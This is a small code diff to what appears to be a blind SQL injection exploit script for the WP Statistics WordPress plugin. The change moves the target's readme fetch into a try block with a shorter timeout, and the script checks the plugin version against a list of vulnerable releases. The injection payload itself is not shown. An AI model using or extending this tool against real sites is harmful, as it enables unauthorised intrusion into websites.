@@ -20,8 +20,8 @@ def blindsql(url):
 		return True
 def exploit(url):
 	curl = url + '/wp-content/plugins/wp-statistics/readme.txt'
-	cver = requests.get(curl, timeout=10, verify=False).text
 	try:
+		cver = requests.get(curl, timeout=5, verify=False).text
 		stable_ver = re.findall('Stable tag\:(.*)', cver)[0].replace(' ', '')
 		print("(+) WP-statistical Plugin Version = " + stable_ver)
 		vuln = ["13.0.7", "13.0.6", "13.0.5", "13.0.4", "13.0.3", "13.0.1", "13.0"]
